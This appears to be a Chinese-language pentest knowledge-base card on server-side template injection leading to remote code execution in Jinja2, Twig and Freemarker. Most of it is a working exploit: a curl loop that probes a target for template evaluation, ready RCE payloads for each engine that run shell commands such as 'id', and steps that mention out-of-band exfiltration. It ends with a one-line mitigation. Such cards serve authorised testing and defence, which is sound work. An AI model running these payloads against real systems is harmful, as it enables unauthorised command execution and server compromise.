---
title: SSTI 模板注入 → RCE（Jinja2 / Twig / Freemarker）
cve: 无（实现缺陷）
severity: critical
cvss: 9.0
product: 模板引擎（Python/Java/PHP 服务端渲染）
versions: 任意
ports: 80, 443
keywords: ssti, 模板注入, jinja2, twig, freemarker, rce
entry: 用户输入被拼进模板字符串
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

- 页面/邮件里回显用户输入（`Hello {{name}}`）；
- 报错页出现模板引擎名字（Jinja2/Twig/Freemarker/Thymeleaf）。

## 前置条件

- 输入进入模板**源码**（而非作为变量传参）。

## PoC

```bash
# 1) 探测（三套语法各试）
for p in '7*7' '{{7*7}}' '${7*7}' '#{7*7}' '{{7*"7"}}'; do
  echo "== $p"; curl -s "https://target/greet?name=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")" | grep -o '49\|7777777' | head -2
done
# 回显 49 = 该引擎在求值
```

```bash
# 2) Jinja2 → RCE
# {{ cycler.__init__.__globals__.os.popen('id').read() }}
# 3) Twig → RCE（Twig 1.x/2.x）
# {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# 4) Freemarker → RCE
# <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

```bash
# 5) 一条命令验证（Jinja2）
curl -s 'https://target/greet' --get --data-urlencode "name={{7*7}}" | grep -o 49
```

## 利用步骤

1. 三套语法探引擎；
2. 用该引擎的 RCE payload 先 `id`；
3. 无回显时用带外（DNS/HTTP）；
4. 证据：回显或带外日志。

## 修复与缓解

- 用户输入只作变量传入；禁模板字符串拼接；沙箱化引擎。

## 参考

- OWASP SSTI；CWE-1336。
